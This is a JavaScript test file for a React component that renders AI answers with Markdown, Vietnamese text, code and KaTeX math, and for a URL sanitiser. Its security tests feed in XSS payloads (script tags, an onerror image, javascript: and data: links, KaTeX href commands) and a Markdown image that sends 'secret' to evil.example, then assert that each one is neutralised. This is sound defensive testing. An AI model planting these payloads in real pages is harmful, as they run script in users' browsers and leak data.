import assert from 'node:assert/strict';
import { test } from 'node:test';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import AiResponse, { safeResponseUrl } from '../src/components/AiPanel/AiResponse.ts';

const render = (text, action = 'explain') => renderToStaticMarkup(createElement(AiResponse, { text, action }));

test('every response format exposes its source page for scoped AI text selection', () => {
  for (const action of ['translate', 'explain', 'ask']) {
    const html=renderToStaticMarkup(createElement(AiResponse,{action,text:'Đoạn trả lời',pageNumber:7}));
    assert.match(html,/data-ai-selection-page="7"/);
  }
  assert.doesNotMatch(render('No source page'),/data-ai-selection-page/);
});

test('explain and ask support Markdown, GFM, Vietnamese and code', () => {
  const source = '## Định luật\n\n**Đậm** và *nghiêng*\n\n- Một\n- Hai\n\n1. Bước một\n2. Bước hai\n\n> Ghi nhớ\n\nUse `window.getSelection()`.\n\n```ts\nconst value = 10;\n```\n\n| A | B |\n| - | - |\n| 1 | 2 |';
  for (const action of ['explain', 'ask']) {
    const html = render(source, action);
    for (const marker of ['<h2>Định luật</h2>', '<strong>Đậm</strong>', '<em>nghiêng</em>', '<ul>', '<ol>', '<blockquote>', '<code>window.getSelection()</code>', 'language-ts', '<table>']) assert.ok(html.includes(marker), marker);
  }
});

test('single-backslash inline and block LaTeX render through KaTeX', () => {
  for (const source of [String.raw`Công thức $E = mc^2$.`, '$x_1 + x_2$', String.raw`$V = I \times R$`]) {
    assert.match(render(source), /class="katex"/);
  }
  for (const source of [String.raw`$$
\int_a^b f(x)\,dx
$$`, String.raw`$$
A = \pi r^2
$$`]) assert.match(render(source), /katex-display/);
});

test('untrusted HTML and Markdown images never create active DOM', () => {
  const html = render('<script>alert(1)</script>\n\n<img src=x onerror=alert(1)>\n\n![](https://evil.example/x?data=secret)');
  assert.doesNotMatch(html, /<script|<img|onerror=/i);
});

test('only explicit HTTP HTTPS mailto links are navigable with opener protection', () => {
  const html = render('[Safe](https://example.com) [Bad](javascript:alert%281%29)');
  assert.match(html, /href="https:\/\/example.com\/" target="_blank" rel="noopener noreferrer"/);
  assert.doesNotMatch(html, /href="javascript:/);
  for (const url of ['javascript:alert(1)', 'data:text/html,x', 'file:///x', 'vbscript:x', '//evil.example', '/api/access']) assert.equal(safeResponseUrl(url), undefined);
  assert.equal(safeResponseUrl('mailto:test@example.com'), 'mailto:test@example.com');
});

test('incomplete and malformed streaming math never throws', () => {
  for (const source of ['$$\nE = mc', String.raw`$$
\frac{a`, String.raw`$\frac{1}{$`, String.raw`$\unknowncommand{x}$`]) assert.doesNotThrow(() => render(source));
  assert.match(render('$$\nE = mc^2\n$$'), /katex-display/);
});

test('trust false disallows math URL and HTML commands', () => {
  const html = render(String.raw`$\href{javascript:alert(1)}{click}$ $\includegraphics{https://evil.example/test}$ $\htmlClass{evil}{x}$`);
  assert.doesNotMatch(html, /<img|href="javascript:|class="evil"/);
});

test('translate retains literal source including Markdown and currency', () => {
  const source = '1. Introduction\n- item\n# heading\n*text*\n_price_\n$5\nTiếng Việt';
  const html = render(source, 'translate');
  assert.ok(html.includes(source));
  assert.doesNotMatch(html, /<h1|<li|<em|class="katex"/);
});

test('currency ambiguity and legacy history behavior are documented, not rewritten', () => {
  assert.match(render('Giá từ $5 đến $10.'), /class="katex"/);
  assert.match(render('# test\n- item\n$5'), /<h1>test<\/h1>/);
  assert.doesNotMatch(render('# test\n- item\n$5', 'translate'), /<h1>/);
});

test('backslash delimiters remain ordinary text without preprocessing', () => {
  for (const source of [String.raw`\(E = mc^2\)`, String.raw`\[
A = \pi r^2
\]`]) assert.doesNotMatch(render(source), /class="katex"/);
});
